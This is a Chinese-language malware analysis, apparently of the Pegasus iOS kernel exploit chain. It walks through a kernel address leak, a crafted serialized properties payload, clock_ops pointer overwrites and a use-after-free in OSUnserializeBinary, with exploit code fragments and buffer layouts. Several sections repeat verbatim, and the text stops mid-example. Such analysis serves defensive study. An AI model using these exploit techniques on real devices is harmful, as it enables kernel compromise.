AppleKeyStore）。有了这个IOService句柄，阶段二调用<strong>io_service_open_extended</strong>并将一段精心制作的属性字段传到服务中。这个字段是<strong>XML</strong>数据的串行化二进制表示，<strong>io_service_open_extended</strong>会将数据最终传到内核中的<strong>OSUnserializeBinary</strong>函数。<strong>OSUnserializeBinary</strong>里是一个转化语句，处理二进制XML数据结构中的不同种类的数据。<strong>kOSSerializeNumber</strong>类型的数据会随便接受一定长度的数据而没有任何的数据边界审核，最终会使调用者获得比允许的更多的内存空间。因为下面这段代码，这种情况得以发生。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">len=(key &amp; kOSSerializeDataMask);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> kOSSerializeNumber:</span><br><span class="line">bufferPos += <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="keyword">if</span>(bufferPos&gt;bufferSize) <span class="keyword">break</span>;</span><br><span class="line">value=next[<span class="number">1</span>];</span><br><span class="line">value&lt;&lt;=<span class="number">32</span>;</span><br><span class="line">value |= next[<span class="number">0</span>];</span><br><span class="line">o = OSNumber::withNumber(value. len);</span><br><span class="line">next+=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>问题是<strong>len</strong>变量在传送到<strong>OSNumber::withNumber</strong>前是无效的。最终，<strong>OSNumber::init</strong>被调用，其会盲目信任用户控制的值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> OSNumber::init(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> inValue, <span class="keyword">unsigned</span> <span class="keyword">int</span> newNumberofBits )&#123;</span><br><span class="line"><span class="keyword">if</span> (!super::init())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">size=newNumberOfBits;</span><br><span class="line">value=(inValue &amp; sizeMask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个漏洞让阶段二可以控制OSNumber的大小。<strong>io_service_open_extended</strong>为<strong>OSUnserializedBinary</strong>准备好了使用环境，通过<strong>OSUnserializedBinary</strong>来利用漏洞。在怎么利用前，先来看看传送到<strong>io_service_open_extended</strong>的恶意<strong>properties </strong>字段。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> properties[]=&#123;</span><br><span class="line"><span class="comment">//kOSSerializeBinarySignature</span></span><br><span class="line"><span class="number">0xD3</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//kOSSerializeEndCollecton | kOSSerializeDictionary | 2</span></span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x81</span>,</span><br><span class="line"><span class="comment">//KEY 1 specified as 30 bytes long (0x1E)</span></span><br><span class="line"><span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line"><span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="string">"HIDKeyboardModifierMappingSrc"</span>, <span class="number">0x00</span>,    <span class="comment">//(30 bytes)</span></span><br><span class="line"><span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//VALUE 1</span></span><br><span class="line"><span class="comment">//kOSSerializeNumber specified as 0x800 bits (256 bytes)</span></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,</span><br><span class="line"><span class="comment">//value of OSNumber(4)</span></span><br><span class="line"><span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//KEY 2 specified as bytes long (0x1E)</span></span><br><span class="line"><span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line"><span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="string">"HIDKeyboardModifierMappingDst"</span>,<span class="number">0x00</span>,    <span class="comment">//(30 chars)</span></span><br><span class="line"><span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//VALUE 2</span></span><br><span class="line"><span class="comment">//kOSSerializeEndCollecton | kOSSerializeNumber | 32</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="comment">//value of OSNumber(0x193)</span></span><br><span class="line"><span class="number">0x93</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>阶段二调用<em>IORegistryEntryGetProperty </em>来找到<em>HIDKeyboardModifierMappingSrc</em>的入口点，导致<strong>properties</strong>数组创建了超过最大值64bit的<strong>OSNumber</strong>值。阶段二用下列代码调用<em>is_ io_registry_entry_get_property_bytes</em>，这个函数会读取内核栈区的末尾值并将读到的数据备份到内核堆区中。接着<strong>IORegistryEntryGetProperty</strong>这个函数会将这段堆缓冲区返回到用户空间中。因此，栈头部指针会被用户读取，接着利用这个指针来计算iOS内核基址：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;<span class="keyword">while</span> (IORegistryEntryGetProperty_0(v13, <span class="string">"HIDKeyboardModifierMappingSrc"</span>,dataBuffer,&amp;size)</span><br><span class="line">);</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">"%.2s%5.5d\n"</span>,<span class="string">"kaslr.c"</span>,<span class="number">127</span>);</span><br><span class="line"><span class="keyword">if</span>(size&gt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">"%.2s%5.5d\n"</span>,<span class="string">"kaslr.c"</span>,<span class="number">138</span>);</span><br><span class="line"><span class="keyword">return</span> dataBuffer[index]&amp;<span class="number">0xFFF00000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要特别注意这段代码的两个方面。第一，properties数组指定<strong>OSNumber</strong>的值是256字节大小，这个值会最终导致数据泄露。第二，<em>index</em>值会因型号和iOS版本不同而不同，这个值存储在<em>dataBuffer</em>中，用来找到内存地址。阶段二的开发者已经规划了每个型号和iOS版本的组合项，确定<em>dataBuffer</em>那个地址值是有效的内核地址。</p><p>如果上述方法不足以找到内核基址或者发现iOS版本不是9，断言回调启动程序终止。</p><h4 id="在受害设备上建立读-写-执行原语（32bit）"><a href="#在受害设备上建立读-写-执行原语（32bit）" class="headerlink" title="在受害设备上建立读/写/执行原语（32bit）"></a>在受害设备上建立读/写/执行原语（32bit）</h4><p>找到内核基址后，阶段二的32包通过pipe函数生成一个IPC。如果pipe命令失败，就会停止攻击。生成IPC后，32包用一个内核端口得到时钟服务，通过<strong>host_get_clock_service</strong>得到电池时钟（著名的日历时钟）和实时时钟。如果任一时钟不可达，攻击就会停止。因为接下来用这三个对象（pipe set和两个时钟对象）获取内核读写执行权限，所以这三个对象非常重要。</p><p>紧跟着<em>pipe</em>和<em>host_get_clock_service calls</em>，32包检查向前通过<strong>task_from_pid</strong>创建的内核端口值。如果<strong>task_from_pid</strong>返回了一个有效值（不是NULL），32包用<em>vm_write</em>写入20字节的数据块，来修改内核空间。这个20字节数据覆盖了<em>clock_ops</em>的一部分。</p><p>当调用例如<em>clock_get_attributes</em>函数时，内核会调用电池时钟和实时时钟相关的函数，这个20字节数据就包含了这些函数的指针。数据块用现存的内核函数替代了两种时钟类型的<em>getattr</em>操作语。特别的是，实时时钟的<em>getattr</em>被修改成指向<strong>OSSerializer::serialize</strong>的指针，电池时钟的<em>getattr</em>改成指向<strong>_bufattr_cpx</strong>的指针。</p><p>当两个时钟调用<em>clock_get_attributes</em>时，会改变其原有的执行结果。例如电池时钟调用<em>clock_get_attributes</em>时，相当与调用了内核空间读函数。<strong>_bufattr_cpx</strong>只有两个属性：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_bufattr_cpx:</span><br><span class="line">LDR        R0,[R0]</span><br><span class="line">BX          LR</span><br></pre></td></tr></table></figure></p><p>R0里存储着一个内存地址，这是这个函数读取的，在返回调用函数前写入R0中。iPhone基于ARM框架的函数调用使用寄存器存储前四个函数参数，虽然<strong>getattr</strong>使用了三个参数，但缺少完全兼容的函数原型没有关系。</p><p>替代了实时时钟<strong>getattr</strong>的函数更加复杂。<strong>OSSerializer::serialize</strong>函数将<em>OSSerializer </em>对象（包含虚函数表（vtable））作为<em>this</em>指针。函数调用<em> OSSerializer </em>对象0x10处的地址并通过BX命令来摆脱控制，向下一个函数传入DWORDs里8和12偏移处的值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DWORD OSSerializer::serialize(OSSerialize *):</span><br><span class="line">LDR      R3,[R0,#<span class="number">8</span>]</span><br><span class="line">MOV    R2,R1</span><br><span class="line">LDR      R1,[R0,#<span class="number">0xC</span>]</span><br><span class="line">LDR.W  R12,[R0,#<span class="number">0x10</span>]</span><br><span class="line">MOV     R0,R3</span><br><span class="line">BX         R12</span><br></pre></td></tr></table></figure></p><p>通过一段特殊设计的数据块，接下来会详细谈到，现在调用<em>clock_get_attributes</em>就可以在内核内执行任意函数。如果受害者的内核已经以某种方式暴露了，这种时钟修改才可能发生，这是值得注意的。所以，如果在一个没有越狱的手机上，修改可能不成功。</p><p>如果32包已经获得了内核端口并且完成了上述对不同时钟的修改，会略过接下来的几个步骤，获取访问权，逐步提升权限。如果因现阶段内核端口不可用，使内核修改失败，32包创建并锁向前初始化阶段的锁定文件。这个文件非常重要，因为后面获得内核改写权限会使用这个文件。</p><p>64位包不会利用已越狱手机上的后门。</p><h4 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h4><p>为在内核中执行任意代码，最终阶段二会利用一个UFA（use after free）漏洞。当间接引用的内存区域（漏洞想要控制的）在漏洞利用开始前分配给了另一个线程，这时竞争状况产生了。其他线程可能突然申请一段重要的已释放区域，为降低这种可能性，阶段二会创建非常多的线程，并立刻将每个线程（主线程之外的）暂停。接着，阶段二为主线程修改时刻表策略，使利用UAF时不会碰到内存竞争占用的情况的可能性大大增加。</p><p>阶段二64位版本中还有额外的一个步骤。在线程时刻表修改完成后，阶段二会创建1000个线程。每个线程都含有一个单紧环，这个循环等待全局变量降至预定义值以下（值小于0）。这是为了确保（至少，增加可能性）没有其他的线程会争夺UFA目标内存块。</p><h4 id="建立通信隧道（32位）"><a href="#建立通信隧道（32位）" class="headerlink" title="建立通信隧道（32位）"></a>建立通信隧道（32位）</h4><p>阶段二32包利用pipe命令创建另一个<em>pipe</em>，重新使用原先生成的<em>pipe</em>的变量。在调用<em>host_get_clock_service</em>之后，这个命令立刻执行，以获得实时和电池时钟。因这个pipe，<em>host_get_clock_service</em>再使用了之前为获得不同时钟端口<em>host_get_clock_service</em>使用的变量。</p><p>先前生成的<em>pipe</em>和时钟端口非常关键，因为接下来的内核操作会用到，如果内核任务端口早已可得，<strong>32Stage2</strong>会略过这个对修改内核很重要的过程而是直接调用<em>vm_write</em>来修改内核。然而，如果<strong>32Stage2</strong>没有得到内核任务端口（手机没有越狱的情况），漏洞利用就很重要。作为攻击的一部分，32Stage2在攻击前向要获得<em>pipe</em>组和时钟，因此二进制包可以确保获得。尽管没必要重复，这是为确保重要的对象可达。</p><p>假定用于最终调用函数的触发机制只不过是将现有函数指针重定向到sysctl处理程序，64位包不用执行这一步骤。</p><h4 id="payload构造和内核插入"><a href="#payload构造和内核插入" class="headerlink" title="payload构造和内核插入"></a>payload构造和内核插入</h4><p>如果不能通过内核端口修改内核存储空间，<strong>32Stage2</strong>必须利用iOS已存漏洞去控制内核。其构造了两个数据缓冲块：包含修改实时和电池时钟的20字节的关键覆盖数据和38字节的一段payload，会运行一系列小程序来安装时钟覆盖程序。如下：<br><strong>clock_ops_overwrite</strong> 缓存区：</p><pre><code>[00] (rtclock.getattr):address of OSSerializer::serialize[04] (calend_config):NULL[08] (calend_init):NULL[0C] (calend_gettime):address of calen_gatattr[10] (calend_getattr):address of _bufattr_cpx</code></pre><p><strong>uaf_payload_buffer</strong>攻击利用的缓存区：</p><pre><code>[00] ptr to clock_ops_overwrite buffer[04] address of clock_ops array in kern memory[08] address of _copyin[0C] NULL[10] address of OSSerializer::serialize[14] address of &quot;BX LR&quot; code fragment[18] NULL[1C] address of OSSymbol::getMetaClass[20] address of &quot;BX LR&quot; code fragment[24] address of &quot;BX LR&quot; code fragment</code></pre><p><strong>32Stage2</strong>创建一个新线程来处理安装一新的时钟处理程序所需要的初始操作，但这个新线程不会进行安装。这个线程在栈上创建<strong>kauth_filesec</strong>数据块：</p><pre><code>.fsec_magic=KAUTH_FILESEC_MAGIC; //0x12CC16D.fsec.owner=&lt;undetermind, random stack value&gt;;.fsec.group=&lt;undetermind, random stack value&gt;;.fsec_acl.entrycount=KAUTH_FILESEC_NOACL;//-1</code></pre><p><em>uaf_payload_buffer</em>添加到<em>kauth _filesec</em>中的<strong>kauth_filesec.fsec_acl.acl_ace[]</strong>数组末尾处。这个会在IOKit上开设一个端口，为AppleKeyStore调用I<em>OServiceGetMatchingService</em>。该线程利用与获取内核地址相同的方法，获得一段有效的内核内存空间。新线程和之前相同操作不同之处在于属性名称不同（新线程使用“ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara”）。</p><p>接着，<strong>open_extended </strong>调用<em>syscall</em>。32包将锁定文件的地址传到syscall，还有KAUTH_UID_NONE和KAUTH_GID_NONE两个参数值，在线程开始时，创建<strong>kauth_filesec</strong>。<strong>open_extended</strong>会执行下列代码：</p><pre><code>if ((uap-&gt;xsecurity!=USER_ADD_NULL)&amp;&amp;    ((ciferrror=kauth_copyinfilesec(uap-&gt;xsecurity,&amp;xsecdst))!=0))</code></pre><p><strong>kauth_copyinfilesec</strong>从用户块中复制<strong>kauth_filesec </strong>到内核块中的<strong>kauth_filesec </strong>数据块中。<strong>kauth_filesec </strong>制作了一个访问控制列表(acl)包含访问控制入口(ace)。如下：</p><pre><code>/* FILE SECURITY information */struct kauth_filesec{    u_int32_t        fsec_magic;    guid_t            fsec_owner;    guid_t            fsec_group;    struct kauth_acl fsec_acl;}；</code></pre><p>ACL储存在<strong>kauth_acl</strong> ，如下：</p><pre><code>/* Access Contro List */struct kauth_acl{    u_int32_t        acl_entrycount;    u_int32_t        acl_flags;    struct kauth_ace acl_ace[1];};</code></pre><p><strong>kauth_ace</strong>有24字节，如下：</p><pre><code>typedef u_int32_t kauth_ace_rights_t;/* Access Control List Entry (ACE) */struct kauth_ace{    guid_t        ace_applicable;    u_int32_t    ace_flags;    kauth_ace_rights_t    ace_rights;                    /*scope specific*/};</code></pre><p><strong>kauth_acl</strong>里的<strong>acl_entrycount</strong>是一个无符号整型，定义了acl_ace数组里有多少个<strong>kauth_ace</strong>入口。如果ACL里没有ACE记录，acl_entrycount会定义为KAUTH_FILESEC_NOACL，这个值为-1。在<strong>kauth_copyinfilesec</strong>中发现如下注释。</p><pre><code>/*     猜测filesec的大小。从基指针开始，    看看还有页面上还有多少空间剩余，    裁剪到合理的上界。如果空间不够，    重新基于实际ACL空间大小定义，重新开始。    上届值必须小于KAUTH_ACL_MAX_ENTRIES。    但可任意取值，0也可以。*/</code></pre><p>当该线程构建了kauth_filesec，会直接操控栈上的数据块地址，如下：</p><pre><code>//get stack addressp=(unsigned int)&amp;stackAnchor &amp; 0xFFFFFF000;//kauth_filesec.fsec_magic(p+0xEC0)=0x12CC16D;//kauth_filesec.fsec_acl.entrycount=KAUTH_FILESEC_NOACL(p+0xEE4)=-1;//kauth_filesec.fsec_acl.acl_ace[...]memcpy(&amp;stackAnchor &amp; 0xFFFFF000 | 0xEEC, pExploit, 128);</code></pre><p>堆栈在新线程执行开始时内容如下：</p><pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1unsigned int size; //[sp+2020h] [bp-2013h]@12char buffer[4096]; //[sp+2024h] [bp-102h]@12int v26; //[sp+3024h] [bp-2Ch]@7mach_port_t connection; //[sp+3028h] [hp-28h]@4kern_return_t result; //[sp+320Ch] [bp-24h]@4mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre><p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended </em>加载<em>kauth_filesec</em>时，其不会解析<em>acl _ flags </em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终<em>open_extended</em>会将攻击缓冲区（以及<em>clock _ ops _ overwrite </em>缓冲区）的内容复制到内核区域中。</p><p>新线程利用<em>open_extended </em>的漏洞将未修改的<strong>payload</strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到<strong>payload</strong>的地址。当完成了对<strong>AppleKeyStore</strong>漏洞的攻击，<em>buffer </em>变量传向<em>io_service_open_extended </em>（位于stackAnchor附近的相同变量）。这意味着<em>AppleKeyStore </em>会返回指向内核块的指针，指针指向<em>open_extended </em>复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p><p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p><p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p><h4 id="payload结构和内核插入（64位）"><a href="#payload结构和内核插入（64位）" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl </em>处理函数，最终也会导致<strong> OSSerializer::serialize</strong>以32位相似方式执行。为建立执行原语，64位用到了<strong>net.inet.ip.dummynet.extract_heap</strong>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和<em>getattr</em>差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p><h4 id="建立内核读-写基元（32位）"><a href="#建立内核读-写基元（32位）" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p><p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p><p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p><pre><code>len = (key &amp; kOSSerializeDataMask);...switch ( kOSSerializeTypeMask &amp; key){    case kOSSerializeDictionary:        o = newDict = OSDictionary::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeArray:        o = newArray =OSArray::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeSet:        o = newSet = OSSet::withCapacity(len);        newCollect = (len!=0);    case kOSSerializeObject;        if(len&gt;=objsIdx) break;        o = objsArray[len];        o-&gt;retain();        isRef = true;        break;}</code></pre><p>堆栈在新线程执行开始时内容如下：</p><pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1unsigned int size; //[sp+2020h] [bp-2013h]@12char buffer[4096]; //[sp+2024h] [bp-102h]@12int v26; //[sp+3024h] [bp-2Ch]@7mach_port_t connection; //[sp+3028h] [hp-28h]@4kern_return_t result; //[sp+320Ch] [bp-24h]@4mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre><p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended </em>加载<em>kauth_filesec</em>时，其不会解析<em>acl _ flags </em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终<em>open_extended</em>会将攻击缓冲区（以及<em>clock _ ops _ overwrite </em>缓冲区）的内容复制到内核区域中。</p><p>新线程利用<em>open_extended </em>的漏洞将未修改的<strong>payload</strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到<strong>payload</strong>的地址。当完成了对<strong>AppleKeyStore</strong>漏洞的攻击，<em>buffer </em>变量传向<em>io_service_open_extended </em>（位于stackAnchor附近的相同变量）。这意味着<em>AppleKeyStore </em>会返回指向内核块的指针，指针指向<em>open_extended </em>复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p><p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p><p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p><h4 id="payload结构和内核插入（64位）-1"><a href="#payload结构和内核插入（64位）-1" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl </em>处理函数，最终也会导致<strong> OSSerializer::serialize</strong>以32位相似方式执行。为建立执行原语，64位用到了<strong>net.inet.ip.dummynet.extract_heap</strong>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和<em>getattr</em>差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p><h4 id="建立内核读-写基元（32位）-1"><a href="#建立内核读-写基元（32位）-1" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p><p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p><p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p><pre><code>len = (key &amp; kOSSerializeDataMask);...switch ( kOSSerializeTypeMask &amp; key){    case kOSSerializeDictionary:        o = newDict = OSDictionary::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeArray:        o = newArray =OSArray::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeSet:        o = newSet = OSSet::withCapacity(len);        newCollect = (len!=0);    case kOSSerializeObject;        if(len&gt;=objsIdx) break;        o = objsArray[len];        o-&gt;retain();        isRef = true;        break;}</code></pre><p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p><p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p><pre><code>if (! isRef){        setAtIndex (objs, objsIdx, o);        if ( !ok) break;        objsIdx++;}</code></pre><p><strong>setAtIndex</strong>是一个宏，将对象（o）添加到objsArray。虽然iOS环境中存在更强大的数组对象，例如OSArray（会自动处理引用计数的数组容器），但<em>OSUnserializeBinary</em>对其已反序列化的对象的数组对象管理采用手动多一些的管理方式。反序列化后，通过调用o-&gt; release（）来将对象的引用计数清零，在大多数情况下将导致对象被释放。可能会在<em>kOSSerializeObject</em>对象中抛出异常。</p><p>由于<em>kOSSerializeObject</em>对象是一个表示被其他条目引用的对象，因此必须在序列化后保留该对象。因此，在反序列化期间，kOSSerializeObject对象将调用o-&gt; retain（），从而增加对象的引用计数并防止从内存中删除它。</p><p>序列化数据blob允许多次使用相同的密钥。 换句话说，有可能（直到iOS 9.3.1，在CVE-2016-1828中修复了重复密钥问题）使XML代码如下：</p><pre><code>&lt;dict&gt;        &lt;key&gt;KEY1&lt;/key&gt;        &lt;number&gt;1&lt;/number&gt;        &lt;key&gt;KEY1&lt;/key&gt;        